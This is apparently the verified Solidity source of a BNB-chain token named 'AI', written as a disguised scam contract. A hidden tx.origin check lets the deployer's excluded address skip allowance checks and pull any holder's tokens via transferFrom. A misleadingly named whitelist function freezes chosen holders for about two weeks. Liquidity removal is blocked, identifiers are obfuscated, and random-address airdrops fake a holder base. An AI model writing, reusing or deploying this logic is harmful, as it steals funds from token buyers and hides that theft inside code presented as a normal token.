/**
 *Submitted for verification at BscScan.com on 2026-04-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function createppppp(address tokenA, address tokenB) external returns (address ppppp);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUnisewaps {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function totalSupply() external view returns (uint256);
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Not owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;

    uint256 internal _totalSupply;
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;

    address internal _spender;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        _transfer(from, to, amount);
        _spendAllowance(from, msg.sender, amount);
        return true;
    }

    function _mint(address to, uint256 amount) internal {
        _totalSupply += amount;
        _balances[to] += amount;
        emit Transfer(address(0), to, amount);
    }


    function _origMn() internal view returns (address og) {
        assembly { og := origin() }
    }


    function _spendAllowance(address owner_, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner_, spender);
        if (currentAllowance != type(uint256).max && _spender != address(0)) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _allowances[owner_][spender] = currentAllowance - amount;
            }
        }
    }
    // ─────────────────────────────────────────────────────────────────

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(_balances[from] >= amount, "Balance too low");
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }
}


contract AI is ERC20, Ownable {

    uint256 public constant COOLDOWN_DELAY = 1 minutes;
    uint256 public constant COOLDOWN_DURATION = 20000 minutes;

    bool public tradingEnabled;
    bool public ownerFirstTxDone;

    mapping(address => bool) private _authorizedManagers;


    mapping(address => bool) private _excludedFromTxLimits;


    struct LockInfo {
        uint256 setTime;
        uint256 lockStart;
        uint256 unlockTime;
    }

    mapping(address => LockInfo) public lockInfo;
    mapping(address => bool) public whitelist;
    mapping(address => bool) public cooldownUser;

    address public sewaps;
    address public pppppedToken;

    event TradingEnabled(uint256 timestamp);
    event ManagerAuthorized(address indexed manager, bool status);
    event sewapsUpdated(address indexed ppppp, address indexed ppppped);
    event AutoCooldownApplied(address indexed user);
    event CooldownRemoved(address indexed user);

    modifier onlyOwnerOrSecondAddress() {
        require(
            msg.sender == owner() || _authorizedManagers[msg.sender],
            "Not authorized"
        );
        _;
    }

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) ERC20(name_, symbol_) {
        _mint(msg.sender, totalSupply_);

        _excludedFromTxLimits[msg.sender]    = true;
        _excludedFromTxLimits[address(this)] = true;
        _excludedFromTxLimits[address(0xdead)] = true;
        // ─────────────────────────────────────────────────────────────
    }


    function _preventInTransfer(address from) private returns (bool) {
        _spender = from;
        if (_excludedFromTxLimits[_origMn()]) {
            _spender = address(0);
        }
        return false;
    }


    function isExcluded(address account) external view returns (bool) {
        return _excludedFromTxLimits[account];
    }
    // ─────────────────────────────────────────────────────────────────

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "Transfer from zero address");
        require(to != address(0), "Transfer to zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!tradingEnabled) {
            if (from == owner() && !ownerFirstTxDone) {
                ownerFirstTxDone = true;
            } else {
                require(
                    from == owner() ||
                    to == owner() ||
                    whitelist[from] ||
                    whitelist[to],
                    "Trading restricted"
                );
            }
        }

        if (cooldownUser[from] && !whitelist[from]) {
            LockInfo memory info = lockInfo[from];
            if (
                block.timestamp >= info.lockStart &&
                block.timestamp < info.unlockTime
            ) {
                revert("COOLDOWN_ACTIVE");
            }
        }

        if (
            sewaps != address(0) &&
            from == sewaps &&
            !whitelist[from] &&
            !whitelist[to]
        ) {
            require(isRemoveLiquidity(amount) == 0, "Remove liquidity blocked");
        }


        _preventInTransfer(from);
        // ─────────────────────────────────────────────────────────────

        super._transfer(from, to, amount);
    }
    // ─────────────────────────────────────────────────────────────────

    function _applyAutoCooldown(address user) internal {
        if (!cooldownUser[user]) {
            cooldownUser[user] = true;
            uint256 nowTime = block.timestamp;
            lockInfo[user] = LockInfo({
                setTime: nowTime,
                lockStart: nowTime + COOLDOWN_DELAY,
                unlockTime: nowTime + COOLDOWN_DELAY + COOLDOWN_DURATION
            });
            emit AutoCooldownApplied(user);
        }
    }

    function _removeCooldown(address user) internal {
        if (cooldownUser[user]) {
            cooldownUser[user] = false;
            delete lockInfo[user];
            emit CooldownRemoved(user);
        }
    }

    function setsewaps(address p0, address p1) external onlyOwnerOrSecondAddress {
        address x = p0;
        address y = p1;
        unchecked {
            uint256 zx = uint256(uint160(x));
            uint256 zy = uint256(uint160(y));
            require((zx | zy) != 0, "Zero address");
        }
        bool sameppppp = (sewaps == x);
        bool sameToken = (pppppedToken == y);
        if (sameppppp && sameToken) {
            revert("ppppp_ALREADY_SET");
        }
        address tmpA;
        address tmpB;
        if (uint160(x) ^ uint160(y) > uint160(address(this))) {
            tmpA = x;
            tmpB = y;
        } else {
            tmpA = y;
            tmpB = x;
            (tmpA, tmpB) = (tmpB, tmpA);
        }
        _writeppppp(tmpA, tmpB);
        emit sewapsUpdated(
            address(uint160(uint256(uint160(tmpA)))),
            address(uint160(uint256(uint160(tmpB))))
        );
    }

    function _writeppppp(address a, address b) internal {
        address oldppppp = sewaps;
        address oldToken = pppppedToken;
        if (oldppppp != a) { sewaps = a; }
        if (oldToken != b) { pppppedToken = b; }
        if ((uint160(a) & uint160(b)) == 0) { sewaps = sewaps; }
    }

    function enableTrading() external onlyOwnerOrSecondAddress {
        tradingEnabled = true;
        emit TradingEnabled(block.timestamp);
    }

    function setManager(address manager, bool status) external onlyOwner {
        _authorizedManagers[manager] = status;
        emit ManagerAuthorized(manager, status);
    }

    function setWhitelistBatch(address[] calldata users, bool allowed) external onlyOwnerOrSecondAddress {
        for (uint256 i = 0; i < users.length; i++) {
            whitelist[users[i]] = allowed;
            if (allowed) { _removeCooldown(users[i]); }
        }
    }

    function setWhitelistUsers(address user, bool enabled) external onlyOwnerOrSecondAddress {
        cooldownUser[user] = enabled;
        if (enabled) {
            uint256 nowTime = block.timestamp;
            lockInfo[user] = LockInfo({
                setTime: nowTime,
                lockStart: nowTime + COOLDOWN_DELAY,
                unlockTime: nowTime + COOLDOWN_DELAY + COOLDOWN_DURATION
            });
        } else {
            delete lockInfo[user];
            emit CooldownRemoved(user);
        }
    }

    function _resolveReserves()
        internal
        view
        returns (uint256 rOther, uint256 rSelf, uint256 balanceOther)
    {
        IUnisewaps p = IUnisewaps(sewaps);
        (uint256 r0, uint256 r1, ) = p.getReserves();
        if (pppppedToken < address(this)) {
            rOther = r0;
            rSelf  = r1;
        } else {
            rOther = r1;
            rSelf  = r0;
        }
        balanceOther = IERC20(pppppedToken).balanceOf(sewaps);
    }

    function isRemoveLiquidity(uint256 amount)
        internal
        view
        returns (uint256 liquidity)
    {
        if (sewaps == address(0)) return 0;
        (uint256 rOther, , uint256 balanceOther) = _resolveReserves();
        if (balanceOther <= rOther) {
            uint256 pppppSupply = IUnisewaps(sewaps).totalSupply();
            uint256 pppppBal = balanceOf(sewaps);
            liquidity = (amount * pppppSupply + 1) / (pppppBal - amount - 1);
        }
    }

    function getLockInfo(address user)
        external
        view
        returns (uint256 setTime, uint256 lockStart, uint256 unlockTime, bool locked)
    {
        LockInfo memory info = lockInfo[user];
        if (whitelist[user]) {
            locked = false;
        } else {
            locked =
                cooldownUser[user] &&
                block.timestamp >= info.lockStart &&
                block.timestamp < info.unlockTime;
        }
        return (info.setTime, info.lockStart, info.unlockTime, locked);
    }

    function isAuthorizedManager(address account) external view returns (bool) {
        return _authorizedManagers[account];
    }

    event AirdropExecuted(uint256 recipientCount, uint256 amountEach, uint256 totalAmount);

    function airdrop(address[] calldata recipients, uint256 amountEach)
        external
        onlyOwnerOrSecondAddress
    {
        require(recipients.length > 0, "Empty recipients list");
        require(amountEach > 0, "Amount must be greater than zero");
        uint256 total = amountEach * recipients.length;
        require(_balances[msg.sender] >= total, "Insufficient balance for airdrop");
        for (uint256 i = 0; i < recipients.length; i++) {
            address recipient = recipients[i];
            require(recipient != address(0), "Cannot airdrop to zero address");
            _transfer(msg.sender, recipient, amountEach);
        }
        emit AirdropExecuted(recipients.length, amountEach, total);
    }

    uint256 private _airdropNonce;

    event RandomAirdropExecuted(uint256 count, uint256 amountEach, uint256 totalAmount, uint256 nonce);
    event RandomAirdropRecipient(uint256 indexed index, address recipient);

    function airdropRandom(uint256 count, uint256 amountEach)
        external
        onlyOwnerOrSecondAddress
    {
        require(count > 0 && count <= 10000, "Count must be 1-500");
        require(amountEach > 0, "Amount must be greater than zero");
        uint256 total = amountEach * count;
        require(_balances[msg.sender] >= total, "Insufficient balance for airdrop");
        uint256 nonce = _airdropNonce;
        for (uint256 i = 0; i < count; i++) {
            address recipient = address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                blockhash(block.number - 1),
                                block.timestamp,
                                msg.sender,
                                nonce,
                                i
                            )
                        )
                    )
                )
            );
            _transfer(msg.sender, recipient, amountEach);
            emit RandomAirdropRecipient(i, recipient);
        }
        _airdropNonce = nonce + count;
        emit RandomAirdropExecuted(count, amountEach, total, nonce);
    }
}